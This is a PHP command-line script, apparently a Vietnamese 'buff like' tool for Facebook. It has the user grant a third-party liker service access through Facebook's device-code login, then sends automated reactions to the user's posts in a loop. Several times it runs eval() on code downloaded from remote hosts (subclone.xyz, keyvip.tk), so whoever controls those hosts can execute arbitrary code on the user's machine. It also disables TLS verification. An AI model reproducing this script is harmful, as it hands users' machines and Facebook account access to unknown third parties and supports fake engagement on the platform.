
error_reporting(0);
$url = array("http://www.machine-liker.com/login/","http://www.machine-liker.com/auth/verify-login/","http://www.machine-liker.com/api/find-post-id/");
$tach = array("<a href=",'"','"https://www.facebook.com');
$trim = array('$v = trim(fgets(STDIN));','$choose = trim(fgets(STDIN));','$post = trim(fgets(STDIN));','$post_viplike = trim(fgets(STDIN));','$file = trim(fgets(STDIN));','$file_input = trim(fgets(STDIN));');
error_reporting(0);
session_start();
system('clear');
$vang="\033[1;33m";
eval(file_get_contents('https://subclone.xyz/logo.php'));
echo "\033[1;37m      = = = = = = = = = = = = = = = = = = = = = = = = = = =\n";usleep(50000);


$noidung = array("\033[1;32mCopy Link Dưới Đây Và Dán Lên Chrome Để Xác Nhận:\033[1;33m\n\033[1;31mhttps://m.facebook.com/device?user_code=","\033[1;37m~\033[1;31m[\033[1;32m✔\033[1;31m]\033[1;37m =>\033[1;32m Nhấn Enter Nếu Đã Xác Nhận: ","Cookie : ","$banner","\033[1;37m~\033[1;31m[\033[1;32m1\033[1;31m]\033[1;37m =>\033[1;32m Buff Like
\033[1;37m~\033[1;31m[\033[1;32m2\033[1;31m]\033[1;37m =>\033[1;32m Buff Tym
\033[1;37m~\033[1;31m[\033[1;32m3\033[1;31m]\033[1;37m =>\033[1;32m Buff HaHa 
\033[1;37m~\033[1;31m[\033[1;32m4\033[1;31m]\033[1;37m =>\033[1;32m Buff Wow 
\033[1;37m~\033[1;31m[\033[1;32m5\033[1;31m]\033[1;37m =>\033[1;32m Buff Buồn
\033[1;37m~\033[1;31m[\033[1;32m6\033[1;31m]\033[1;37m =>\033[1;32m Buff Giận Dữ
\033[1;37m~\033[1;31m[\033[1;32m7\033[1;31m]\033[1;37m =>\033[1;32m Buff Tất Cả Random
\033[1;37m~\033[1;31m[\033[1;32m●\033[1;31m]\033[1;37m =>\033[1;32m Nhập Chế Độ:\033[1;33m ","URL Post: ","ID: ","Có : ");
$access = login_machine($url[0]);
$lmg = html_entity_decode($access); 
$link_allow = explode($tach[0],$lmg);
$link_very = explode($tach[1],$link_allow[8])[1];
$ma = explode("=",$link_very)[1];

//bắt đầu
system('clear');
eval(file_get_contents("https://subclone.xyz/logo.php"));
for($i=0; $i<=15; $i++){
echo "\033[1;31m─ ";
usleep(20000);
echo "\033[1;37m─ ";
usleep(20000);
}
echo "\n";
echo "\033[1;32mCopy Link Dưới Đây Và Dán Lên Thanh Tìm Kiếm Chrome Và Cấp Quyền Ứng Dụng\n\033[1;41m\033[1;37m Copy Dòng Dưới \033[0m \033[1;31m👇\nhttps://m.facebook.com/device?user_code=$ma\n";
echo "\033[1;37m~\033[1;31m[\033[1;32m✔\033[1;31m]\033[1;36m =>\033[1;32m Cấp Quyền Ứng Dụng Xong Thì Ấn Enter: ";
eval($trim[0]);
//kiểm tra
$very = very($url[1]);
$val = fopen("manh.txt","w+");

if($very["status"] == 'ok'){
echo "\033[1;37m~\033[1;32m Xác Thực Thành Công\n";
sleep(2);
} else {
exit("\033[1;37m~\033[1;31m Thất Bại, Chưa Cấp Quyền Để Xác Thực\n");
}
//qua bước xác thực bên trên sẽ đến phần làm nv
@system("clear");
eval(file_get_contents("https://keyvip.tk/logo.php"));
echo "                    \033[1;47;31mTool Buff Like Tây Siêu VIP\033[0m\n";
for($i=0; $i<=15; $i++){
echo "\033[1;31m─ ";
usleep(20000);
echo "\033[1;37m─ ";
usleep(20000);
}
echo "\n";
  //id Facebook
  $id = $very["user"]["id"];
  //tên fb
  $name = $very["user"]["name"];
  $url = $very["user"]["url"];
  
 //hiển thị thông tin acc
echo "\033[1;32mBạn Đã Đăng Nhập Acc:\033[1;36m $name \n\033[1;32mID:\033[1;33m $id\n";
$trim[4] = "";
  eval($trim[4]);
  if($file == false){
  $vip_like = reaction_get_id();
  $h = explode($tach[2],$vip_like);
  $cout = count($h);
  for($v = 0;$v<=$cout;$v++){
    $cot = explode('"',$h[$v])[0];
    if(strpos($cot,"posts")){
      $post_so = $post_so + 1;
    }}
echo "\033[1;32mNick\033[1;33m $name \033[1;32mCó\033[1;36m $post_so \033[1;32mBài Viết\nNhập Số Bài Viết Muốn Tăng: \033[1;37m";
    eval($trim[3]);
  for($v = 0;$v<=$post_viplike + 1;$v++){
    $cot = explode('"',$h[$v])[0];
    if(strpos($cot,"posts")){
      $z_shot = "https://www.facebook.com$cot";
      $get_post = find_id("http://www.machine-liker.com/api/find-post-id/",$z_shot);
      fwrite($val,"$get_post\n");
    }
  }}else{
    echo"Nhập File: ";
    eval($trim[5]);
    $get_post = file_get_contents($file_input);
   fwrite($val,"$get_post\n");
  }
for($i=0; $i<=15; $i++){
echo "\033[1;31m─ ";
usleep(20000);
echo "\033[1;37m─ ";
usleep(20000);
}
echo "\n";
echo $noidung[4];
  eval($trim[1]);
  
  if($choose == 1){
    $re = "1";
  }elseif($choose == 2){
    $re = "2";
  }elseif($choose == 3){
    $re = "4";
  }elseif($choose == 4){
    $re = "3";
  }elseif($choose == 5){
    $re = "7";
  }elseif($choose == 6){
    $re = "8";
  }else{
    $re = "1,2,3,4,5,6";
  }
 for($i=0; $i<=15; $i++){
echo "\033[1;31m─ ";
usleep(20000);
echo "\033[1;37m─ ";
usleep(20000);
}
echo "\n";
  $s = 0;
  while(true){
  $data = file_get_contents("manh.txt");
   $get = file("manh.txt",FILE_IGNORE_NEW_LINES|FILE_SKIP_EMPTY_LINES);
  $stt_id = 0;
  $vip_like_cout = -1;
  for($v=0;$v<=count($get) - 1;$v++){
   $stt_id = $stt_id+1;
   $vip_like_cout = $vip_like_cout + 1;
  $get_post = $get[$vip_like_cout];
  $complete = send_rect("http://www.machine-liker.com/api/send-reactions/",$get_post,$re);
  $json = json_decode($complete,true);
  if($json["status"] == "ok"){
  //loại job
    $type = $json["info"]["type"];
    //$mess = $json["info"]["message"];
    //$tt = $json["info"]["next"];
    $s = $s+1;
    echo "\033[1;31m[\033[1;36m$s\033[1;31m] \033[1;33m$type\033[1;31m | \033[1;32mThành Công\033[1;31m |\033[1;37m ID:\033[1;35m $get_post \n"; 
    for($v = 600;$v > 0;$v--){
    	for($a = 30 ; $a < 38;$a++){
      echo "\033[1;".$a."mVui lòng chờ | $v | Giây\r";
      usleep(120000);}
   }
 }else{
echo "\r\033[1;32mĐang Buff Bài Tiếp Theo\r";
 sleep(1);
  }
    
  }}

//chức năng

function login_machine($link){
$ch=curl_init();
curl_setopt($ch, CURLOPT_URL, $link);

curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36');
curl_setopt($ch, CURLOPT_ENCODING, '');

curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie_machine.txt");
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
$access = curl_exec($ch);
curl_close($ch);
return($access);
}
function very($link_very){
$ch=curl_init();
curl_setopt($ch, CURLOPT_URL, $link_very);

curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36');
curl_setopt($ch, CURLOPT_ENCODING, '');

curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie_machine.txt");
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
$access = curl_exec($ch);
curl_close($ch);
return(json_decode($access,true));
}
function send_rect($link_send,$post_id,$react){
$ch=curl_init();
curl_setopt($ch, CURLOPT_URL, $link_send);

curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36');
curl_setopt($ch, CURLOPT_ENCODING, '');

curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie_machine.txt");
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
$data = array(
  "post_id" => $post_id,
  "reactions" => $react,
  "limit" => 100,
  );
    curl_setopt($ch, CURLOPT_POST, count($data));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
$access = curl_exec($ch);
curl_close($ch);
return($access);
}
function find_id($link_id,$post_id){
$ch=curl_init();
curl_setopt($ch, CURLOPT_URL, $link_id);
$head[] = "Host: www.machine-liker.com";
$head[] = "Connection: keep-alive";
$head[] = "Content-Length: 119";
$head[] = "X-Requested-With: XMLHttpRequest";
$head[] = "Content-Type: application/x-www-form-urlencoded; charset=UTF-8";
$head[] = "Origin: http://www.machine-liker.com";
$head[] = "Referer: http://www.machine-liker.com/auto-reactions/";
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36');
curl_setopt($ch, CURLOPT_ENCODING, '');

curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie_machine.txt");
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
$data = array(
  "url" => $post_id,
  );
    curl_setopt($ch, CURLOPT_POST, count($data));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
$access = curl_exec($ch);
curl_close($ch);
$hi = json_decode($access,true);
$id = $hi["post"]["id"];
return $id;
}
function reaction_get_id(){
$ch=curl_init();
curl_setopt($ch, CURLOPT_URL, "http://www.machine-liker.com/auto-reactions/");

curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36');
curl_setopt($ch, CURLOPT_ENCODING, '');

curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie_machine.txt");
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
$access = curl_exec($ch);
curl_close($ch);
return($access);
}
